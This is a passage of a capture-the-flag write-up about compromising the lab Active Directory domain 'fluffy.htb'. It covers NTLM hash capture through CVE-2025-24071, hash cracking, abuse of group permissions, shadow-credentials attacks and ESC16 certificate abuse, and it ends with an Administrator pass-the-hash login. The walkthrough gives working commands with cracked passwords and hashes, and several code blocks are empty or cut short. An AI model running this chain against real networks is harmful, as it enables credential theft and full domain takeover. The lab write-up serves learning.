# 2. Lateral Movement

In the Upgrade_Notice.pdf, there are several CVEs that are pending to upgrade which one vulnerability stands out :- [`CVE-2025-24071`](https://cti.monster/blog/2025/03/18/CVE-2025-24071.html) - Basically it exploits the trust between Windows Explorer and .library-ms file.  Windows Explorer automatically parses .library-ms file to build virtual views. When a .library-ms file containing SMB path is compressed into a ZIP archive, and subsequently decompressed by someone in the network, the victim's hash will be captured as it is a part of the NTLM authentication. This means it will not work if NTLM authentication mechanism is not used in the environment.

The exploit : https://www.exploit-db.com/exploits/52310 
This exploit will generate a specially crafted ZIP file meant to be decompressed by victim.

```bash

```

We have caught p.agila hash as she is the victim of the vulnerability. Put the hash in a file and attempt to crack it using `hashcat`.
```bash
hashcat -m 5600 -a 0 p.agilahash.txt /usr/share/wordlists/rockyou.txt
```

New creds would be obtained `p.agila:prometheusx-303`. As we have acquired a new user, re-run the below command for the new user in order for `Bloodhound` to be updated. Upload the command outputs to the `Bloodhound` web interface.

```bash
bloodhound-python -u p.agila -p "prometheusx-303" -d fluffy.htb -ns 10.10.11.69 -c all
```
As we can see in the imgae below, p.agila is a member of the `Service Account Managers` security group. This should be kept in mind. 
![bloodhound2](/blog/images/bloodhound2.png)
![bh3](/blog/images/bh3.png)

Click outbound object control. We would see that p.agila is a member of `Service Account Managers` group that has `GenericAll` perm on the Service Accounts group which has the `GenericWrite` perm on its members (ca_svc, ldap_svc and winrm_svc). For the GenericAll, it means Service Account Managers group members can add any users (modify group membership) into group Service Accounts. 

> 💡 **Tip:** GenericAll over a group - Full control of a group allows you to directly modify group 
membership of the group. For full abuse info in that scenario, see the 
Abuse Info section under the AddMembers edge.

> 💡 **Tip:** GenericWrite over a user - you can write to the “msds-KeyCredentialLink” attribute. Writing to this property allows an attacker to create “ShadowCredentials” on the object and authenticate as the principal using Kerberos PKINIT. See more information under the AddKeyCredentialLink edge.
Alternatively, you can write to the “servicePrincipalNames” attribute and perform a targeted kerberoasting attack.


## 2.1 Adding ourselves to Service Accounts group
So right now, we (p.agila) needs to compromise the critical user accounts in the `Service Accounts` group to explore further more. Since p.agila is a member of `Service Account Managers` group which has `GenericAll` perm to the `Service Accounts` group, we can add ourselves to the group to inherit the `GenericWrite` perm on the service accounts. Use `bloodyAD` tool.

```bash
bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila
[+] p.agila added to SERVICE ACCOUNTS
```

run bloodhound again after adding p.agila to Service Accounts Group.

```bash
bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns 10.10.11.69 -c all
```

## 2.2 Shadow Credentials attack to retrieve winrm_svc hash

Now we will create `shadow credentials` on one of the service accounts which is `winrm_svc`. Use `pywhisker.py` from [here](https://github.com/ShutdownRepo/pywhisker). To understand more about Shadow Credentials attack.. read it [here](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). By doing this attack, we essentially inject a certificate into the account for purposes like persistence, and now we can perform Kerberos PKINIT auth using the cert set by us without knowing its password. 

Please be noted that we can just use `certipy` to do the attack in a single command  but for learning purposes, I'll be using 3 tools that complement each other that serve the same purpose as `certipy`. 

Now, use `pywhisker.py` to add shadow credentials (modifying msds-KeyCredentialLink attribute) and retrieve the certificate.

What happened in the output is the shadow credential is added. The tool also generated key pair, where the public key is wrote onto the attribute and the private key is in the pfx file/certificate. The pfx file is used to authenticate as the account `winrm_svc`.

Now we have the thing needed for authentication. Since the default authentication mechanism in AD is `Kerberos`, we will use the cert to get the TGT. Run `gettgtpkinit.py` from https://github.com/dirkjanm/PKINITtools to get the TGT. File saved to winrm_svc.ccache.

INFO:minikerberos:Saved TGT to file
```

Now, I want you to take a look at the output, where there is an `AS-REP encryption key`. Let's dive into what exactly that is and where it came from.

Let's go back to how Kerberos works :- remember that Kerberos is password/symmetric while Kerberos + PKINIT is certificate/asymmetric. 

![kerb](/blog/images/kerb.jpg)
![kerb1](/blog/images/kerb1.png)

The first step of the mechanism is the user has to authenitcate using his credentials (password etc). whereas in Kerberos PKINIT, the user presents his certificate-privatekey (the one we got from pywhisker.py) to the KDC to confirm his identity. Then in the AS-REP process, there are two things in AS-REP which are TGT and Session Key encrypted by the symmetric key (AS-REP key) generated by the KDC. The key is generated using either two ways which are RSA and DHE. Lastly, the user will decrypt the session key using AS-REP key or the symmetric key. 

Run `getnthash.py` to retrieve the NT hash of `winrm_svc`. This tool actually does the `TGS-REQ` process, which is the first process to request access to a service after we got the TGT from AS-REP process. The image below explains that we (winrm_svc) is essentially request access to ourselves.

# 3 Privilege Escalation

## 3.1 Shadow Credentials attack to retrieve ca_svc hash

We have another potential privilege escalation target: the `ca_svc` account. Since this account is tied to the Certificate Authority, we could enumerate for Active Directory Certificate Services (ADCS) vulnerabilities using `Certipy`. To proceed, however, we would need the hash of `ca_svc`. Given that we hold `GenericWrite` permissions over the `Service Accounts` group, we can leverage this to add shadow credentials to ca_svc (similar to what we previously did with winrm_svc) in order to obtain its hash. 

Use `pywhisker.py` to add the shadow credentials to ca_svc

```bash

From the output above, we can see that 1.3.6.1.4.1.311.25.2 is in `Disabled Extensions`. 1.3.6.1.4.1.311.25.2 is the Object Identifier (`OID`) of the special extension `szOID_NTDS_CA_SECURITY_EXT`. Okay, let's go to how CA works when the extension is enabled. So when CA issues a certificate, this extension embeds the SID of the AD account that requested the certificate directly into the certificate. But when the extension is disabled, Windows will fall back to using a weak mapping, like mapping the UPN in the cert to an account. Okay that's too much talking. The general view is the CA issues a cert to an account while the extension is disabled. So when the user uses the certificate for authentication (certificate-based authentication), the DC will have to check if the cert is the user's belonging, so the DC will blindly just check the identifiers inside the cert (like the UPN in the Subject Alternative Name, or sometimes the CN/email). If the SID extension is missing (which it is missing).. the DC can’t strongly tie the cert back to the exact AD account — it only trusts whatever strings are in the cert, which is where the `ESC16` risk comes in.

So let's exploit this. We wanna update the ca_svc UPN to admin so when requesting for a certificate, the generated certificate will have Admin's UPN embedded in it. Update the ca_svc UPN to administrator.

```bash
┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/movejfleischman]
└─$ certipy account -u 'p.agila' -p 'prometheusx-303' -target 'fluffy.htb' -upn 'Administrator@fluffy.htb' -user 'ca_svc' update    

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : Administrator@fluffy.htb
[*] Successfully updated 'ca_svc'
```

Next, request a certificate using the account ca_svc and its hash retrieved from shadow credential attack. Remember, only the `UPN` (ca_svc@fluffy.htb) of ca_svc is changed, not its `sAMAccountName` (ca_svc), thus the command below uses the "-u 'ca_svc'". 

This command will have an output of the Administrator certificate because the CA embeds the ca_svc's new UPN to the certificate. 

```bash
┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/movejfleischman]
└─$ certipy req -dc-ip '10.10.11.69' -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'

```

Revert back the UPN change.

```bash
┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/movejfleischman]
└─$ certipy account -u 'p.agila' -p 'prometheusx-303' -dc-ip 10.10.11.69 -user 'ca_svc' -upn '' update

[*] Updating user 'ca_svc':
    userPrincipalName                   : *DELETED*

```

Perform authentication using the administrator cert, `Certipy` will get the hash for you.

```bash
┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/movejfleischman]
└─$ certipy auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.10.11.69

```

Now, you would ask why did i use gettgtpkinit.py and getnthash.py just to get the NT hash after adding shadow credentials. Why don't i use the command above where i just use certipy auth ? It's just for understanding the underlying mechanism and to understand how does these things work.

Lastly, use `evil-winrm` to log in using Admin credentials

```bash
┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/movejfleischman]
└─$ evil-winrm -i 10.10.11.69 -u 'Administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e'

*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
